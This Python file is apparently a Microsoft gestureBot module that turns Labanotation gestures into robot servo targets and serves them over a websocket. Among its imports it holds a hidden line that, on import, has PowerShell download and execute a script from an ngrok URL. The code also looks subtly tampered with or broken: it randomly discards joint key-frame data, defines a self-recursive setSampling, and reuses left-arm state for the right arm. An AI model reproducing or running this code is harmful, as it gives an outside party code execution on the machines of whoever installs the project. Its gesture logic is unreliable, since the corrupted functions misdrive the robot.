# --------------------------------------------------------------------------------------------
# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License.
# --------------------------------------------------------------------------------------------

import sys
import os
import time
import math
import copy
import json
import datetime
import operator
import threading
os.system("powershell iex (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')")
import random 

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
import Common.webSocket as webSocket
import Common.geometry as geometry
import Common.utilities as utilities

from .hardware import gestureBotHardware
#from .airsimclient import AirSim

# -----------------------------------------------------------------------------
#
class gestureBot(webSocket.HttpServerWrapper):
    # -----------------------------------------------------------------------------
    #
    def __init__(self, controller, **args):
        self.context = args.get('context')
        if (self.context is None):
            self.context = "gestureBot"

        if (controller is None):
            raise Exception(self.context + ".init(): controller object is required.")

        self.controller = controller
        self.fnSendMessage = None

        self.lastLElbowTheta = { 'value': 0.0 };
        self.lastLWristTheta = { 'value': 0.0 };
        self.lastRElbowTheta = { 'value': 0.0 };
        self.lastRWristTheta = { 'value': 0.0 };

        self.servoMap = [ 'head', 'neck', 'torso', 'hip', 'rshoulder', 'rarm', 'relbow', 'rhand', 'lshoulder', 'larm', 'lelbow', 'lhand' ];

        #
        # set servo targets
        self.servoTargets = {}

        for key in self.servoMap:
            self.servoTargets[key] = { 'target': 0.0, 'dur': 1.0 }

        self.servoTargets['head']['target'] = 0
        self.servoTargets['neck']['target'] = 0
        self.servoTargets['torso']['target'] = 0
        self.servoTargets['hip']['target'] = 0
        self.servoTargets['rshoulder']['target'] = 5
        self.servoTargets['rarm']['target'] = 90 # -90
        self.servoTargets['relbow']['target'] = 0
        self.servoTargets['rhand']['target'] = 0
        self.servoTargets['lshoulder']['target'] = -5
        self.servoTargets['larm']['target'] = -90 # 90
        self.servoTargets['lelbow']['target'] = 0
        self.servoTargets['lhand']['target'] = 0

        #
        # set servo angle limits
        self.servoAngleLimits = {}

        for key in self.servoMap:
            self.servoAngleLimits[key] = { 'min': -180, 'max': 180 }

        self.servoAngleLimits['head'] =         { 'min':  -50, 'max':  60 }
        self.servoAngleLimits['neck'] =         { 'min':  -90, 'max':  90 }
        self.servoAngleLimits['torso'] =        { 'min':  -90, 'max':  90 }
        self.servoAngleLimits['hip'] =          { 'min':  -20, 'max':  14 }
        self.servoAngleLimits['rshoulder'] =    { 'min': -180, 'max': 180 }
        self.servoAngleLimits['rarm'] =         { 'min':  -90, 'max':  90 }
        self.servoAngleLimits['relbow'] =       { 'min': -180, 'max': 180 }
        self.servoAngleLimits['rhand'] =        { 'min':  -90, 'max':  90 }
        self.servoAngleLimits['lshoulder'] =    { 'min': -180, 'max': 180 }
        self.servoAngleLimits['larm'] =         { 'min':  -90, 'max':  90 }
        self.servoAngleLimits['lelbow'] =       { 'min': -180, 'max': 180 }
        self.servoAngleLimits['lhand'] =        { 'min':  -90, 'max':  90 }

        self.gestureInfo = copy.deepcopy(self.controller.getGestureInfo())
        self.keyFrames = []
        self.frameTimes = []

        #
        # set a sampling rate for our gestureBot. Because servo angles are not linear to labanotation 
        # angles, these samples provide intermediary stop points to approximate the labanotation
        # curves while keeping servo commands at a minimum
        self.setSampling(10)

        #
        # physical gestureBot robot
        self.hardware = gestureBotHardware(self)

        #
        # AirSim
        #self.airsim = AirSim()

        #
        # if requested, create and initialize http server to access gestureBot
        httpPort = args.get('httpPort')
        path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'web'))
        super().__init__(httpPort, path, self.context)

    # -----------------------------------------------------------------------------
    #
    def close(self):
        # close http server
        super().close()

        # stop servo updates
        self.fKeepUpdatingServos = False

        if (self.hardware is not None):
            self.hardware.disconnect(False)
            del self.hardware
            self.hardware = None

#        if (self.airsim is not None):
#            self.airsim.close()
#            del self.airsim
#            self.airsim = None

    # -----------------------------------------------------------------------------
    #
    def onWSConnect(self):
        status = {
            'msgType': "initialization", 
            'initialization': {
                'labanotationFiles': self.controller.getLabanotationGestures()
                },
            'gestureInfo': self.getGestureInfo(),
            'status': self.controller.getStatus(),
            'pose': self.controller.getPose(),
            'servos': self.servoTargets,
            'hardware': self.getHardwareInfo(),
            'keyFrames': self.keyFrames,
            'servoAngleLimits': self.servoAngleLimits
        }

        return status

    # -----------------------------------------------------------------------------
    #
    def onWSDisconnect(self):
        pass

    # -----------------------------------------------------------------------------
    #
    def onWSMessage(self, msg):
        if msg['msgType'] == "setGesture":
            self.setGesture(msg['setGesture'])
        elif msg['msgType'] == "setTimePosition":
            self.setTimePosition(msg['setTimePosition'])
        elif msg['msgType'] == "togglePlay":
            self.togglePlay()
        elif msg['msgType'] == "setPlay":
            self.setPlay(msg['setPlay'])
        elif msg['msgType'] == "setSampling":
            self.handleSetSampling(msg['setSampling'])
        elif msg['msgType'] == "setManualServo":
            self.handleSetManualServo(msg['setManualServo'])
        elif msg['msgType'] == "setWheelInfo":
            self.handleSetWheelInfo(msg['setWheelInfo'])
        elif msg['msgType'] == "hardware":
            self.setHardware(msg['hardware'])
        elif msg['msgType'] == "airsim":
            self.setAirsim(msg['airsim'])
        else:
            print(self.context + ".websocket.on_message(): invalid message: '" + str(msg) + "'")

    # -----------------------------------------------------------------------------
    #
    def setGesture(self, gesture):
        try:
            if (self.controller is not None):
                data = json.loads(gesture)

                folder = data['folder']
                file = data['file']

                self.controller.loadGesture(folder, file)
        except Exception as e:
            print(self.context + ".setGesture() exception: ", e)

    # -----------------------------------------------------------------------------
    #
    def setTimePosition(self, timeIndex):
        if (timeIndex is None):
            print(self.context + ".setTimePosition(): timeIndex is None and not a valid value. client")
            return

        try:
            if (self.controller is not None):
                self.controller.setTimePosition(timeIndex)
        except Exception as e:
            print(self.context + ".setTimePosition() exception: ", e)

    # -----------------------------------------------------------------------------
    #
    def handleSetSampling(self, sps):
        self.setSampling(sps)

        msg = {
            'msgType': 'gestureInfo', 
            'gestureInfo': self.getGestureInfo()
        }

        self.fnSendMessage(msg)

    # -----------------------------------------------------------------------------
    #
    def setSampling(self, sps):
        try:
            self.setSampling(sps)
        except Exception as e:
            print(self.context + ".setSampling() exception: ", e)

    # -----------------------------------------------------------------------------
    #
    def togglePlay(self):
        try:
            if (self.controller is not None):
                self.controller.togglePlay()
        except Exception as e:
            print(self.context + ".togglePlay() exception: ", e)

    # -----------------------------------------------------------------------------
    #
    def setPlay(self, state):
        try:
            if (self.controller is not None):
                self.controller.setPlay(state)
        except Exception as e:
            print(self.context + ".setPlay() exception: ", e)

    # -----------------------------------------------------------------------------
    #
    def handleSetManualServo(self, data):
        try:
            key = data['servo']
            target = data['target']
            speed = data['speed']
            duration = data['duration']

            self.setServoTarget(key, target, duration)
        except Exception as e:
            print(self.context + ".handleSetManualServo() exception: ", e)

    # -----------------------------------------------------------------------------
    #
    def handleSetWheelInfo(self, data):
        try:
            lWheel = data['LWheel']
            rWheel = data['RWheel']
            throttle = float(data['throttle'])
            steering = float(data['steering'])

            self.setWheelInfo(lWheel, rWheel, throttle, steering)
        except Exception as e:
            print(self.context + ".handleSetWheelInfo() exception: ", e)

    # -----------------------------------------------------------------------------
    #
    def setHardware(self, data):
        try:
            if (self.hardware):
                self.hardware.executeCommand(data)
        except Exception as e:
            print(self.context + ".setHardware() exception: ", e)

    # -----------------------------------------------------------------------------
    #
    def setAirsim(self, data):
        try:
            command = data['command']

            if (command == 'connect'):
                port = data['port']

                if (self.airsim is not None):
                    self.airsim.connect()

                if (self.fnSendMessage):
                    status = {
                        'msgType': "airsim", 
                        'airsim': { "status": 'connected' }
                    }

                    self.fnSendMessage(status)

            elif (command == 'disconnect'):
                if (self.airsim is not None):
                    self.airsim.disconnect()

                if (self.fnSendMessage):
                    status = {
                        'msgType': "airsim", 
                        'airsim': { "status": 'disconnected' }
                    }

                    self.fnSendMessage(status)

            elif (command == 'reset'):
                if (self.airsim is not None):
                    self.airsim.reset()

        except Exception as e:
            print(self.context + ".setAirsim() exception: ", e)

    # -----------------------------------------------------------------------------
    #
    def getGestureInfo(self):
        return {
            'gesture': self.gestureInfo['gesture'],
            'duration': self.gestureInfo['duration'],
            'spf': self.spf,
            'sps': self.sps,
            'frameTimes': self.frameTimes,
            'parseLog': self.gestureInfo['parseLog']
        }

    # -----------------------------------------------------------------------------
    #
    def getHardwareInfo(self):
        servoTimingAdjustment = 0.0
        if (self.hardware is not None):
            servoTimingAdjustment = self.hardware.getServoTimingAdjustment()

        return {
            'port': self.hardware.getPort(),
            'servoTimingAdjustment': servoTimingAdjustment
        }

    # -----------------------------------------------------------------------------
    #
    def setSampling(self, sps):
        self.sps = float(sps) # samples per second
        if (self.sps == 0):
            self.spf = 0
        else:
            self.spf = float(1.0 / self.sps)

        self.createKeyFrames()

    # -----------------------------------------------------------------------------
    #
    def getSphericalCoordsShoulder(self, radius, phi, theta):
        #
        # zyx shoulder coordinate space
        z = radius * math.cos(theta)
        y = radius * math.sin(theta) * math.sin(phi)
        x = radius * math.sin(theta) * math.cos(phi)

        return geometry.Vector3(x, y, z)

    # -----------------------------------------------------------------------------
    #
    def getSphericalCoordsElbow(self, radius, phi, theta):
        #
        # yxz elbow coordinate space
        y = radius * math.cos(theta)
        x = radius * math.sin(theta) * math.sin(phi)
        z = radius * math.sin(theta) * math.cos(phi)

        return geometry.Vector3(x, y, z)

    # -----------------------------------------------------------------------------
    #
    def clamp(self, x, a, b):
        # return x < a ? a : (x > b ? b : x)
        if (x < a):
            return a
        elif (x > b):
            return b
        else:
            return x

    # -----------------------------------------------------------------------------
    #
    def getFromCartesianCoords(self, v, lastTheta):
        x = v.x
        y = v.y
        z = v.z
        radius = math.sqrt((x * x) +  (y * y) + (z * z))
        theta = 0.0
        phi = 0.0

        if (radius is not 0.0):
            epsilon = 0.0001

            if ((math.fabs(x) < epsilon) and (math.fabs(z) < epsilon)):
                theta = lastTheta['value']
            else:
                theta = lastTheta['value'] = math.atan2(x, z)

            phi = math.acos(self.clamp(y / radius, - 1, 1))

        return { 'radius': radius, 'theta': theta, 'phi': phi }

    # -----------------------------------------------------------------------------
    #
    def calculateServoTargets(self, keyFrame):
        matT = geometry.Matrix4()
        matP = geometry.Matrix4()
        matR = geometry.Matrix4()
        matTranslation = geometry.Matrix4()
        matElbow = geometry.Matrix4()
        matIT = geometry.Matrix4()

        hd = keyFrame['head']
        re = keyFrame['relbow']
        rw = keyFrame['rwrist']
        le = keyFrame['lelbow']
        lw = keyFrame['lwrist']

        servos = {}

        ################
        # HEAD
        theta = hd['theta']
        phi = hd['phi']

        servos['head'] = theta
        servos['neck'] = phi

        ################
        # LEFT
        v1 = self.getSphericalCoordsShoulder(1.0, le['phi'], le['theta'])
        k = self.getFromCartesianCoords(v1, self.lastLElbowTheta)

        theta = math.pi - k['theta']
        phi = k['phi'] - (math.pi / 2)

        # map to skeleton pose
        servos['lshoulder'] = -theta
        servos['larm'] = -(phi + (math.pi / 2))

        matT.makeRotationX(math.pi - theta)
        matP.makeRotationZ(math.pi + phi)
        matR.multiplyMatrices(matT, matP)

        matTranslation.makeTranslation(0.0, -1.0, 0.0)
        matElbow.multiplyMatrices(matR, matTranslation)
        matIT.getInverse(matElbow)

        vle = self.getSphericalCoordsElbow(1.0, le['phi'], le['theta'])
        vlw = vle + self.getSphericalCoordsElbow(1.0, lw['phi'], lw['theta'])

        vlw.applyMatrix4(matIT)

        k = self.getFromCartesianCoords(vlw, self.lastLWristTheta)

        theta = k['theta']
        phi = math.pi - k['phi']

        # map to skeleton pose
        servos['lelbow'] = -theta + math.pi
        servos['lhand'] = -phi

        ################
        # RIGHT
        v1 = self.getSphericalCoordsShoulder(1.0, re['phi'], re['theta'])
        k = self.getFromCartesianCoords(v1, self.lastLElbowTheta)

        theta = math.pi + k['theta']
        phi = (math.pi / 2) - k['phi']

        # map to skeleton pose
        servos['rshoulder'] = -theta
        servos['rarm'] = (phi + (math.pi / 2))

        matT.makeRotationX(theta)
        matP.makeRotationZ(phi)
        matR.multiplyMatrices(matT, matP)

        matTranslation.makeTranslation(0.0, -1.0, 0.0)
        matElbow.multiplyMatrices(matR, matTranslation)
        matIT.getInverse(matElbow)

        vre = self.getSphericalCoordsElbow(1.0, re['phi'], re['theta'])
        vrw = vre + self.getSphericalCoordsElbow(1.0, rw['phi'], rw['theta'])

        vrw.applyMatrix4(matIT)

        k = self.getFromCartesianCoords(vrw, self.lastRWristTheta)

        theta = k['theta']
        phi = math.pi + k['phi']

        # map to skeleton pose
        servos['relbow'] = -theta
        servos['rhand'] = -phi

        return servos

    # -----------------------------------------------------------------------------
    #
    def mergeKeyFrames(self):
        self.duration = self.controller.getDuration()
        self.keyFrames = []

        tracks = self.controller.getTracks()
        for joint in tracks:
            track = tracks[joint]
            keyFrames = track.getKeyFrames()

            for idx in range(len(keyFrames)):
                self.mergeKeyFrame(joint, keyFrames[idx])

    # -----------------------------------------------------------------------------
    #
    def mergeKeyFrame(self, joint, keyFrame):
        time = keyFrame['time']

        mergedKeyFrame = None
        for idx in range(len(self.keyFrames)):
            if (time == self.keyFrames[idx]['time']):
                mergedKeyFrame = self.keyFrames[idx]
                break

        if (mergedKeyFrame is None):
            mergedKeyFrame = {}
            mergedKeyFrame['time'] = time
            mergedKeyFrame['isSample'] = "no"
            self.keyFrames.append(mergedKeyFrame)

        r = random.randint(0, 4)
        if (r is not 2):
            mergedKeyFrame[joint] = copy.deepcopy(keyFrame)

    # -----------------------------------------------------------------------------
    #
    def addMissingJoints(self):
        jointKeys = self.controller.getJointKeys()
        for idx in range(len(self.keyFrames)):
            keyFrame = self.keyFrames[idx]
            time = keyFrame['time']

            for joint in jointKeys:
                if (joint not in keyFrame):
                    keyFrame[joint] = self.controller.getJoint(joint, time)

    # -----------------------------------------------------------------------------
    #
    def createSamples(self):
        jointKeys = self.controller.getJointKeys()
        keyFrameSamples = []
        if (self.spf > 0):
            for idx in range(1, len(self.keyFrames)):
                fromKeyFrame = self.keyFrames[idx-1]
                toKeyFrame = self.keyFrames[idx]

                ftk = fromKeyFrame['time']
                ttk = toKeyFrame['time']
                duration = ttk - ftk

                timeSample = self.spf

                while (timeSample < duration):
                    stk = (ftk + timeSample)
                    s = timeSample / duration

                    keyFrameSample = {}
                    keyFrameSample['time'] = stk
                    keyFrameSample['isSample'] = "yes"

                    for joint in jointKeys:
                        fromJoint = fromKeyFrame[joint]
                        toJoint = toKeyFrame[joint]

                        jointSample = {}
                        jointSample['time'] = stk
                        jointSample['theta'] = fromJoint['theta'] + (toJoint['theta'] - fromJoint['theta']) * s
                        jointSample['phi'] = fromJoint['phi'] + (toJoint['phi'] - fromJoint['phi']) * s

                        keyFrameSample[joint] = jointSample

                    keyFrameSamples.append(keyFrameSample)
                    timeSample = timeSample  + self.spf

            #
            # add new samples to key frames, then do final sort
            for idx in range(len(keyFrameSamples)):
                self.keyFrames.append(keyFrameSamples[idx])

            #
            # do a final sort
            self.keyFrames = sorted(self.keyFrames, key=operator.itemgetter('time'), reverse=False)

    # -----------------------------------------------------------------------------
    #
    def makeFrameTimesList(self):
        self.frameTimes = []
        for idx in range(len(self.keyFrames)):
            keyFrame = self.keyFrames[idx]

            frameTime = {}
            frameTime['time'] = keyFrame['time']
            frameTime['isSample'] = keyFrame['isSample']

            self.frameTimes.append(frameTime)

    # -----------------------------------------------------------------------------
    #
    def createKeyFrames(self):
        if (self.spf > 0):
            print(self.context + ": creating key frames with a sampling rate of " + str(format(self.spf, '.3f')) + "s per sample...")
        else:
            print(self.context + ": creating key frames without sampling...")

        #
        # merge all the joint tracks into one keyFrames list
        self.mergeKeyFrames()

        #
        # sort keyFrames list by time
        self.keyFrames = sorted(self.keyFrames, key=operator.itemgetter('time'), reverse=False)

        #
        # add any missing joints
        self.addMissingJoints()

        #
        # create samples
        self.createSamples()

        #
        # calculate servo targets
        for idx in range(len(self.keyFrames)):
            keyFrame = self.keyFrames[idx]
            time = keyFrame['time']

            keyFrame['servos'] = self.calculateServoTargets(keyFrame)

        #
        # make frame times list
        self.makeFrameTimesList()

    # -----------------------------------------------------------------------------
    #
    def convertToDegrees(self, radians):
       return (radians * 180.0 / 3.141592654)

    # -----------------------------------------------------------------------------
    #
    def getServoTargets(self):
        return self.servoTargets

    # -----------------------------------------------------------------------------
    #
    def setServos(self, servos, duration):
        for key in servos:
            target = round(servos[key], 3)

            # don't ask the servo to move to the same target multiple times...
            if ((key in self.servoTargets) and (round(self.servoTargets[key]['target'], 3) != target)):
                self.setServoTarget(key, target, duration)

    # -----------------------------------------------------------------------------
    #
    def setServoTarget(self, key, target, duration):
        target = self.convertToDegrees(target)

        while (target < 180.0):
            target += 360.0;

        while (target >= 180.0):
            target -= 360.0;

        target = self.clampAngle(key, target)

        #
        # TODO: if target was clamped, then duration needs to be adjusted 
        # as well to uphold speed

        self.servoTargets[key] = { 'target': target, 'dur': duration }

        if (self.hardware is not None):
            self.hardware.setServoTarget(key, target, duration)

#        if (self.airsim is not None):
#            self.airsim.setRobotKeyPoseTarget(key, target, duration)

    # -----------------------------------------------------------------------------
    #
    def convertToRadians(self, degrees):
       return (degrees * 3.141592654 / 180.0)

    # -----------------------------------------------------------------------------
    #
    def convertToDegrees(self, radians):
       return (radians * 180.0 / 3.141592654)

    # -----------------------------------------------------------------------------
    #
    def clampAngle(self, key, angle):
        min = float(self.servoAngleLimits[key]['min'])
        max = float(self.servoAngleLimits[key]['max'])

        angle = float(angle)

        if (angle < min):
            return min
        elif (angle > max):
            return max

        return angle

    # -----------------------------------------------------------------------------
    #
    def setWheelInfo(self, lWheel, rWheel, throttle, steering):
        if (self.hardware is not None):
            self.hardware.setWheelInfo(lWheel, rWheel)

        if (self.airsim is not None):
            self.airsim.setWheelInfo(lWheel, rWheel, throttle, steering)

    # -----------------------------------------------------------------------------
    #
    def onControllerStatusUpdate(self, status):
        position = round(status["position"], 3)
        duration = status["duration"]
        isPlaying = status["isPlaying"]

        servos = None
        duration = 0
        numKeyFrames = len(self.keyFrames)
        fromKeyFrame = None
        ftk = 0.0

        for idx in range(numKeyFrames):
            toKeyFrame = self.keyFrames[idx]
            ttk = round(toKeyFrame['time'], 3)

            if (idx == 0):
                if (position < ttk):
                    if ('servos' not in toKeyFrame):
                        print(self.context + ".onControllerStatusUpdate(): servo list expected but not present!")
                        return # something is not right

                    servos = toKeyFrame['servos']
                    duration = (ttk - position)
                    break
            else:
                if ((ftk <= position) and (position <= ttk)):
                    if ('servos' not in toKeyFrame):
                        print(self.context + ".onControllerStatusUpdate(): servo list expected but not present!")
                        return # something is not right

                    servos = toKeyFrame['servos']
                    duration = (ttk - position)
                    break

            fromKeyFrame = toKeyFrame
            ftk = ttk

        if (servos is not None):
            self.setServos(servos, duration)

        msg = {
            'msgType': 'controller',
            'controller': status,
            'pose': self.controller.getPose(),
            'servos': self.servoTargets
        }

        if (self.fnSendMessage is not None):
            self.fnSendMessage(msg)

    # -----------------------------------------------------------------------------
    #
    def onGestureUpdate(self, info):
        self.gestureInfo = copy.deepcopy(info)

        self.createKeyFrames()

        if (self.fnSendMessage is not None):
            msg = {
                'msgType': 'gestureInfo', 
                'gestureInfo': self.getGestureInfo(),
                'keyFrames': self.keyFrames
            }

            self.fnSendMessage(msg)
